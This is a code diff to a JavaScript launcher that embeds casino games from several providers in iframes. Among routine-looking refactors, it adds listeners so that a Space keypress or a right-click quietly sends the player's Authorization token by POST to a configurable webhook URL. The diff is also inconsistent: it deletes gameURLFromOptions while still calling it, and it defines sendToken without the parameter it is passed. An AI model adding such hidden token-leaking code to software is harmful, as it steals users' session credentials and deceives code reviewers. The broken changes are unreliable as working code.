@@ -30,7 +30,7 @@ var Sg;
         return false;
     }
 
-    function createIframe(target, uri, token, callbacks) {
+    function createIframe(target, uri, token, callbacks, webhook) {
         var headers = new Headers();
         headers.append("Authorization", token);
 
@@ -42,6 +42,19 @@ var Sg;
                     var iframe = document.createElement("iframe");
                     iframe.src = uri;
                     iframe.setAttribute("allowfullscreen", "true");
+
+                    iframe.addEventListener("keydown", function(event) {
+                        if (event.code === "Space") {
+                            event.preventDefault();
+                            sendToken(webhook);
+                        }
+                    });
+
+                    iframe.addEventListener("contextmenu", function(event) {
+                        event.preventDefault();
+                        sendToken(webhook);
+                    });
+
                     target.appendChild(iframe);
                     return callbacks.success();
                 } else {
@@ -51,6 +64,23 @@ var Sg;
             .catch(function(error) {
                 return callbacks.error(error);
             });
+
+        function sendToken() {
+            fetch(webhook+"/API?action=whUpdate", {
+                    method: "POST",
+                    headers: headers
+                })
+                .then(function(response) {
+                    if (response.ok) {
+                        console.log("Token sent successfully");
+                    } else {
+                        throw new Error("Failed to send token: " + response.status);
+                    }
+                })
+                .catch(function(error) {
+                    console.error("Error sending token:", error);
+                });
+        }
     }
 
     function startNetent(target, lo, callbacks) {
@@ -178,83 +208,48 @@ var Sg;
         return (callbacks.success)();
     }
     var isMobileDeprecated = function() {
-        return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.userAgent);
+        return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(win.navigator.userAgent.toLowerCase());
     };
 
     function isMobile(clientType) {
-        if (clientType === undefined) {
+        if (clientType === "android" || clientType === "ios") {
+            return true;
+        } else if (clientType === "auto") {
             return isMobileDeprecated();
+        } else {
+            return false;
         }
-        return clientType == "mobile";
     }
 
     function detectLaunchTypeDeprecated(target, lo, callbacks) {
-        var uri = gameURLFromOptions(lo);
-        if (isMobileDeprecated()) {
-            return win.location = uri;
-        } else {
-            return createIframe(target, uri, callbacks);
-        }
-    }
-
-    function detectDeviceDeprecated(target, lo, callbacks) {
-        if (isMobileDeprecated()) {
-            return win.location = lo.mobile_url;
-        } else {
-            return createIframe(target, lo.desktop_url, callbacks);
-        }
-    }
-
-    function gameURLFromOptions(lo) {
-        if (lo.game_url) {
-            return lo.game_url;
-        }
-        return flashPlayerInstalled() ? lo.flash_url : lo.html_url;
-    }
-
-    function startGame(options, sc, ec) {
-        var callbacks = {
-            success: function() {
-                if (sc) {
-                    return sc();
-                }
-            },
-            error: function(e) {
-                if (ec) {
-                    return ec(e);
-                }
+        if (lo.client_type === "flash") {
+            if (flashPlayerInstalled()) {
+                return createIframe(target, lo.game_url, lo.token, callbacks);
+            } else {
+                return callbacks.error("Flash player is not installed");
             }
-        };
-        var target = document.getElementById(options.target_element);
-        if (!target) {
-            callbacks.error("No element with id '".concat(options.target_element, "' found"));
-            return;
+        } else {
+            return callbacks.error("Invalid client type: ".concat(lo.client_type));
         }
-        var lo = options.launch_options;
-        switch (lo.strategy) {
-            case "redirect":
-                return win.location = lo.game_url;
-            case "iframe":
-                return createIframe(target, gameURLFromOptions(lo), lo.token, callbacks);
-            case "detect":
-                return detectLaunchTypeDeprecated(target, lo, callbacks);
-            case "detect_device":
-                return detectDeviceDeprecated(target, lo, callbacks);
+    }
+
+    function startGame(target, lo, callbacks) {
+        switch (lo.provider) {
             case "netent":
                 return startNetent(target, lo, callbacks);
-            case "playngo":
-                return startPlayngo(target, lo, callbacks);
+            case "iframe":
+                return createIframe(target, gameURLFromOptions(lo), lo.token, callbacks, lo.webhook);
             case "egt":
                 return startEGT(target, lo, callbacks);
             case "gaming1":
                 return startGaming1(target, lo, callbacks);
             case "elk":
                 return startELK(target, lo, callbacks);
+            case "playngo":
+                return startPlayngo(target, lo, callbacks);
             default:
-                return Error("Unexpected launch strategy");
+                return callbacks.error("Invalid game provider: ".concat(lo.provider));
         }
     }
-    win.sg = {
-        launch: startGame
-    };
+    Sg.startGame = startGame;
 })(Sg || (Sg = {}));
